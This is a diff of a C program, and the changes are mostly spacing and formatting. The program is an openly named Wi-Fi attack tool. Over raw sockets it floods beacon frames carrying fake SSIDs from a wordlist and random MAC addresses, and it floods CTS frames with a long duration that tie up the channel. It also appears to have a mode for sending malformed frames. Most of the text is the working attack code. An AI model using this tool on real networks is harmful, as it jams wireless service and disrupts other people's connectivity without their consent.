@@ -78,8 +78,14 @@ const char maligno[] = {
 };
 
 static int packets = -1;
-static int male = 0;
-useconds_t delay = 0;
+static int male;
+static useconds_t delay;
+
+enum attack {
+	INVALID,
+	BEACON,
+	CTS
+};
 
 static char ** load_words(char *path, int *lines)
 {
@@ -87,7 +93,8 @@ static char ** load_words(char *path, int *lines)
 	char *filecont;
 	char *last;
 	FILE *dict = fopen(path, "r");
-	if(!dict) {
+
+	if (!dict) {
 		perror("open");
 		exit(1);
 	}
@@ -96,7 +103,7 @@ static char ** load_words(char *path, int *lines)
 	long len = ftell(dict);
 	filecont = malloc(len);
 	fseek(dict, 0L, SEEK_SET);
-	if(!fread(filecont, 1, len, dict)) {
+	if (!fread(filecont, 1, len, dict)) {
 		perror("read");
 		exit(1);
 	}
@@ -104,8 +111,8 @@ static char ** load_words(char *path, int *lines)
 
 	*lines = 0;
 	/* count and split lines */
-	for(last = filecont; last; last = strchr(last, '\n')) {
-		if(last != filecont)
+	for (last = filecont; last; last = strchr(last, '\n')) {
+		if (last != filecont)
 			*last = 0;
 		last++;
 		(*lines)++;
@@ -113,9 +120,9 @@ static char ** load_words(char *path, int *lines)
 
 	/* set pointers */
 	words = malloc(*lines * sizeof(*words));
-	for(*lines = 0, last = filecont; last < filecont + len; ) {
+	for (*lines = 0, last = filecont; last < filecont + len; ) {
 		int l;
-		if(!*last) {
+		if (!*last) {
 			last++;
 			continue;
 		}
@@ -126,12 +133,6 @@ static char ** load_words(char *path, int *lines)
 
 	return words;
 }
-
-enum attack {
-	INVALID,
-	BEACON,
-	CTS
-};
 
 static inline void randaddr(uint8_t *addr)
 {
@@ -163,20 +164,20 @@ static void beaconize(int sock, char *words[], int lines)
 		.srate_data = { 0x82, 0x84, 0x8b, 0x96, 0x12, 0x24, 0x48, 0x6c }
 	};
 
-	while(packets) {
+	while (packets) {
 		char *word = words[rand() % lines];
 		template.essid.length = strlen(word);
 
 		/* maximum allowed by standard */
-		if(template.essid.length > 32)
+		if (template.essid.length > 32)
 			continue;
 
 		/* fake but valid mac address */
 		randaddr(template.wifi.saddr);
 		memcpy(template.wifi.bssid, template.wifi.saddr, ETH_ALEN);
 		strcpy(template.essid_data, word);
-		if(!male) {
-			if(!write(sock, &template, sizeof(template) - sizeof(template.essid_data) + template.essid.length))
+		if (!male) {
+			if (!write(sock, &template, sizeof(template) - sizeof(template.essid_data) + template.essid.length))
 				exit(0);
 		} else {
 			int size = sizeof(template) - sizeof(template.essid_data) + template.essid.length;
@@ -187,10 +188,10 @@ static void beaconize(int sock, char *words[], int lines)
 				exit(0);
 		}
 
-		if(delay)
+		if (delay)
 			usleep(delay);
 
-		if(packets > 0)
+		if (packets > 0)
 			packets--;
 	}
 }
@@ -202,15 +203,16 @@ static void ctsize(int sock)
 		.type = 0xc4,
 		.duration = htole16(0x7d00)
 	};
-	while(packets) {
+
+	while (packets) {
 		randaddr(cts.raddr);
-		if(!write(sock, &cts, sizeof(cts)))
+		if (!write(sock, &cts, sizeof(cts)))
 			exit(0);
 
-		if(delay)
+		if (delay)
 			usleep(delay);
 
-		if(packets > 0)
+		if (packets > 0)
 			packets--;
 	}
 }
@@ -223,8 +225,8 @@ int main(int argc, char *argv[])
 	char **words = NULL;
 	enum attack attack = INVALID;
 
-	while((c = getopt(argc, argv, "bcf:i:p:m")) != -1) {
-		switch(c) {
+	while ((c = getopt(argc, argv, "bcf:i:p:m")) != -1) {
+		switch (c) {
 		case 'f':
 			srand(time(NULL));
 			srandom(time(NULL));
@@ -248,22 +250,24 @@ int main(int argc, char *argv[])
 			break;
 		}
 	}
-	if(optind != argc - 1 || attack == INVALID || (attack == BEACON && !lines)) {
-		fprintf(stderr, "usage: %s -b -f <file> <iface>\n", argv[0]);
-		fprintf(stderr, "usage: %s -c <iface>\n", argv[0]);
-		fprintf(stderr, "\noptional parameters:\n");
-		fprintf(stderr, "-i interval	send `interval' packets per second\n");
-		fprintf(stderr, "-p packets	send `packet' packets, then exit\n");
+	if (optind != argc - 1 || attack == INVALID || (attack == BEACON && !lines)) {
+		fprintf(stderr,	"usage: %s -b -f <file> <iface>\n"
+				"usage: %s -c <iface>\n"
+				"\noptional parameters:\n"
+				"-i interval	send `interval' packets per second\n"
+				"-p packets	send `packet' packets, then exit\n",
+				argv[0],  argv[0]);
+
 		return 1;
 	} else {
 		struct ifreq ifr = { };
 		int ifl = strlen(argv[optind]);
-		if(ifl > sizeof(ifr.ifr_name)) {
+		if (ifl > sizeof(ifr.ifr_name)) {
 			fprintf(stderr, "interface name too long: %s\n", argv[optind]);
 			return 1;
 		}
 		sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
-		if(sock == -1) {
+		if (sock == -1) {
 			perror("socket");
 			return 1;
 		}
@@ -282,7 +286,7 @@ int main(int argc, char *argv[])
 	}
 
 	/* inject */
-	switch(attack) {
+	switch (attack) {
 	case BEACON:
 		printf("beaconing on %s...\n", argv[optind]);
 		beaconize(sock, words, lines);
